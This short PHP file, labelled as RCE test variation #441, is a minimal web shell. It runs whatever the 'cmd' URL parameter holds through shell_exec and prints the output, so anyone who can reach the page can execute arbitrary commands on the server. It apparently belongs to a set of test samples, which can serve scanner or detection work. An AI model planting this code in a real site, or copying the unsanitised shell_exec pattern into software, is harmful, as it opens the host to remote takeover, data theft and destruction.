<?php
// RCE test variation #441
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>